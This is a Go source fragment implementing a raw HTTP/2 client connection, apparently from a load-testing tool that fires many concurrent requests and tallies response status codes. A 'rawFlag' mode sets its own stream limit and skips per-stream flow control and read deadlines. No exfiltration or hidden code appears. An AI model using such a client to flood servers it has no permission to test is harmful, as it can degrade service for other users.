			h.currentStatus, _ = strconv.Atoi(f.Value)
		}
	})
	if rawFlag {
		h.maxStreams = rawMaxStreams
	}
	h.streamCond = sync.NewCond(&h.streamMu)

	h.bw.WriteString(h2ClientPreface)

	settings := make([]byte, 24)
	settings[0], settings[1] = 0x00, 0x01
	settings[2], settings[3], settings[4], settings[5] = 0x00, 0x00, 0x01, 0x00
	settings[6], settings[7] = 0x00, 0x02
	settings[8], settings[9], settings[10], settings[11] = 0x00, 0x00, 0x00, 0x00
	settings[12], settings[13] = 0x00, 0x04
	settings[14], settings[15], settings[16], settings[17] = 0x00, 0x10, 0x00, 0x00
	settings[18], settings[19] = 0x00, 0x05
	settings[20], settings[21], settings[22], settings[23] = 0x00, 0x40, 0x00, 0x00
	h.writeFrameDirect(h2FrameSettings, 0, 0, settings)

	winUpd := make([]byte, 4)
	wu := uint32(0x00ffffff)
	binary.BigEndian.PutUint32(winUpd, wu)
	h.writeFrameDirect(h2FrameWindowUpdate, 0, 0, winUpd)

	h.bw.Flush()

	go h.writer()
	go h.reader()

	return h
}

func (h *h2Conn) writeFrameDirect(ftype, flags uint8, streamID uint32, payload []byte) {
	n := len(payload)
	var hdr [9]byte
	hdr[0] = byte(n >> 16)
	hdr[1] = byte(n >> 8)
	hdr[2] = byte(n)
	hdr[3] = ftype
	hdr[4] = flags
	hdr[5] = byte(streamID >> 24)
	hdr[6] = byte(streamID >> 16)
	hdr[7] = byte(streamID >> 8)
	hdr[8] = byte(streamID)
	h.bw.Write(hdr[:])
	if n > 0 {
		h.bw.Write(payload)
	}
}

func (h *h2Conn) close() {
	h.closeOnce.Do(func() {
		atomic.StoreUint32(&h.closed, 1)
		close(h.done)
		h.conn.Close()
		h.streamMu.Lock()
		h.streamCond.Broadcast()
		h.streamMu.Unlock()
	})
}

func (h *h2Conn) releaseStreamSlot() {
	if atomic.AddUint32(&h.activeStreams, ^uint32(0)) > 0x7fffffff {
		atomic.StoreUint32(&h.activeStreams, 0)
	}
	if atomic.LoadUint32(&h.waiters) != 0 {
		h.streamMu.Lock()
		h.streamCond.Signal()
		h.streamMu.Unlock()
	}
}

func (h *h2Conn) releaseStream(streamID uint32) {
	if _, ok := h.releasedStreams[streamID]; ok {
		return
	}
	h.releasedStreams[streamID] = struct{}{}
	if len(h.releasedStreams) > 1<<20 {
		for k := range h.releasedStreams {
			if k+2 < streamID {
				delete(h.releasedStreams, k)
			}
		}
	}
	h.releaseStreamSlot()
}

func (h *h2Conn) acquireStreamBlocking() bool {
	h.streamMu.Lock()
	for {
		if atomic.LoadUint32(&h.closed) != 0 {
			h.streamMu.Unlock()
			return false
		}
		if atomic.LoadUint32(&h.activeStreams) < atomic.LoadUint32(&h.maxStreams) {
			atomic.AddUint32(&h.activeStreams, 1)
			h.streamMu.Unlock()
			return true
		}
		atomic.AddUint32(&h.waiters, 1)
		if atomic.LoadUint32(&h.activeStreams) < atomic.LoadUint32(&h.maxStreams) {
			atomic.AddUint32(&h.waiters, ^uint32(0))
			continue
		}
		h.streamCond.Wait()
		atomic.AddUint32(&h.waiters, ^uint32(0))
	}
}

func (h *h2Conn) writer() {
	defer h.close()
	for {
		select {
		case msg := <-h.wantWrite:
			h.writeMsg(msg)
			drained := false
			for !drained {
				select {
				case msg2 := <-h.wantWrite:
					h.writeMsg(msg2)
				default:
					h.bw.Flush()
					drained = true
				}
			}
		case <-h.done:
			return
		}
	}
}

func (h *h2Conn) writeMsg(msg frameMsg) {
	if msg.ftype == h2FrameHeaders {
		id := atomic.AddUint32(&h.nextStreamID, 2) - 2
		if id > 0x7fffff00 {
			h.releaseStreamSlot()
			return
		}
		msg.streamID = id
	}
	h.writeFrameDirect(msg.ftype, msg.flags, msg.streamID, msg.payload)
}

func (h *h2Conn) reader() {
	defer h.close()

	var lastDeadline time.Time
	hdr := make([]byte, 9)
	for {
		if !rawFlag && time.Since(lastDeadline) > 5*time.Second {
			h.conn.SetReadDeadline(time.Now().Add(30 * time.Second))
			lastDeadline = time.Now()
		}

		if _, err := io.ReadAtLeast(h.br, hdr, 9); err != nil {
			h.close()
			return
		}
		length := int(hdr[0])<<16 | int(hdr[1])<<8 | int(hdr[2])
		ftype := hdr[3]
		flags := hdr[4]
		streamID := uint32(hdr[5]&0x7f)<<24 | uint32(hdr[6])<<16 |
			uint32(hdr[7])<<8 | uint32(hdr[8])

		if length < 0 || length > 0x01000000 {
			h.close()
			return
		}

		payload := h.getFrameBuf(length)
		if length > 0 {
			if _, err := io.ReadAtLeast(h.br, payload, length); err != nil {
				h.putFrameBuf(payload)
				h.close()
				return
			}
		}

		h.handleFrameNormal(ftype, flags, streamID, payload)
	}
}

func (h *h2Conn) handleFrameNormal(ftype uint8, flags uint8, streamID uint32, payload []byte) {
	defer h.putFrameBuf(payload)

	switch ftype {
	case h2FrameHeaders:
		h.handleHeaders(streamID, payload, flags)
	case h2FrameSettings:
		h.handleSettings(payload, flags)
	case h2FramePing:
		if flags&0x1 == 0 {
			pingPayload := make([]byte, len(payload))
			copy(pingPayload, payload)
			select {
			case h.wantWrite <- frameMsg{ftype: h2FramePing, flags: 0x1, streamID: 0, payload: pingPayload}:
			case <-h.done:
			}
		}
	case h2FrameGoAway:
		h.close()
	case h2FrameRSTStream:
		h.releaseStream(streamID)
	case h2FrameData:
		dataLen := len(payload)
		if flags&0x8 != 0 && dataLen > 0 {
			padLen := int(payload[0])
			if padLen+1 <= dataLen {
				dataLen -= padLen + 1
			}
		}
		if dataLen > 0 {
			inc := uint32(dataLen)
			var wu0 [4]byte
			binary.BigEndian.PutUint32(wu0[:], inc)
			select {
			case h.wantWrite <- frameMsg{ftype: h2FrameWindowUpdate, flags: 0, streamID: 0, payload: wu0[:]}:
			case <-h.done:
			}
			if !rawFlag {
				var wu1 [4]byte
				binary.BigEndian.PutUint32(wu1[:], inc)
				select {
				case h.wantWrite <- frameMsg{ftype: h2FrameWindowUpdate, flags: 0, streamID: streamID, payload: wu1[:]}:
				case <-h.done:
				}
			}
		}
		if flags&0x1 != 0 {
			h.releaseStream(streamID)
		}
	case h2FrameWindowUpdate:
	}
}

func (h *h2Conn) handleHeaders(streamID uint32, payload []byte, flags uint8) {
	if flags&0x8 != 0 && len(payload) > 0 {
		padLen := int(payload[0])
		if padLen+1 <= len(payload) {
			payload = payload[1 : len(payload)-padLen]
		}
	}
	if flags&0x20 != 0 && len(payload) >= 5 {
		payload = payload[5:]
	}

	h.currentStatus = 0
	if len(payload) > 0 {
		h.dec.Write(payload)
	}
	status := h.currentStatus

	if status != 0 {
		switch {
		case status >= 200 && status < 300:
			atomic.AddInt64(&stat2xx, 1)
		case status >= 300 && status < 400:
			atomic.AddInt64(&stat3xx, 1)
		case status >= 400 && status < 500:
			atomic.AddInt64(&stat4xx, 1)
		case status >= 500:
			atomic.AddInt64(&stat5xx, 1)
		}
	}

	if flags&0x1 != 0 {
		if !(status >= 100 && status < 200) {
			h.releaseStream(streamID)
		}
	}
}

func (h *h2Conn) handleSettings(payload []byte, flags uint8) {
	if flags&0x1 != 0 {
		return
	}
	for i := 0; i+6 <= len(payload); i += 6 {
		settingID := uint16(payload[i])<<8 | uint16(payload[i+1])
		settingVal := uint32(payload[i+2])<<24 | uint32(payload[i+3])<<16 |
			uint32(payload[i+4])<<8 | uint32(payload[i+5])
		switch settingID {
		case settingMaxConcurrent:
			if settingVal > 0 {
				want := settingVal
				if want > maxStreamsUpper {
					want = maxStreamsUpper
				}
				atomic.StoreUint32(&h.maxStreams, want)
			}
		case settingHeaderTableSize:
			h.dec.SetMaxDynamicTableSize(settingVal)
		}
	}
	select {
	case h.wantWrite <- frameMsg{ftype: h2FrameSettings, flags: 0x1, streamID: 0}:
	case <-h.done:
	}
}

func (h *h2Conn) sendRequest(hblock []byte, ctx context.Context) error {
	for {
		cur := atomic.LoadUint32(&h.activeStreams)
		if cur < atomic.LoadUint32(&h.maxStreams) {
			if atomic.CompareAndSwapUint32(&h.activeStreams, cur, cur+1) {
				break
			}
			continue
		}
		if !h.acquireStreamBlocking() {
			return errConnDone
		}
		break
	}

	msg := frameMsg{
		ftype:   h2FrameHeaders,
		flags:   0x01 | 0x04 | 0x20,
		payload: hblock,
	}

	select {
	case h.wantWrite <- msg:
		return nil
	case <-h.done:
		h.releaseStreamSlot()
		h.close()
		return errConnDone
	case <-ctx.Done():
		h.releaseStreamSlot()
		return ctx.Err()
	}
}

func (h *h2Conn) getFrameBuf(n int) []byte {
	v := framePool.Get()
	if v != nil {
		b := v.([]byte)
		if cap(b) >= n {
			return b[:n]
		}
		framePool.Put(b[:0])
	}
	return make([]byte, n)
}

func (h *h2Conn) putFrameBuf(b []byte) {
	if cap(b) > 0x10000 {
		return
	}
	framePool.Put(b[:0])
}